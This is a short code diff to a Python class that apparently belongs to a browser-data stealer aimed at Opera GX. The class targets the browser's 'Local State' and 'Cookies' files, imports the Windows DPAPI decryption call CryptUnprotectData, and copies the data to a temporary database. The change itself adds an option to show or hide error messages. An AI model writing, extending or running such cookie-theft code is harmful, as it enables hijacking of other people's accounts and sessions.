@@ -11,10 +11,11 @@ from win32crypt import CryptUnprotectData
 
 class Opera_GX:
 
-    def __init__(self, storage_path: str, storage_folder: str):
+    def __init__(self, storage_path: str, storage_folder: str, errors_print: bool):
 
         self.storage_path = storage_path
         self.storage_folder = storage_folder
+        self.errors_print = errors_print
 
         self.state_path = environ['USERPROFILE'] + sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State'
         self.cookies_path = environ['USERPROFILE'] + sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Cookies'
@@ -83,4 +84,11 @@ class Opera_GX:
             remove(f"{self.storage_path}Opera_GX.db")
 
         except Exception as e:
-            print(repr(e))
+
+            if self.errors_print is True:
+
+                print(f"[OPERA_GX]: {repr(e)}")
+
+            else:
+
+                pass
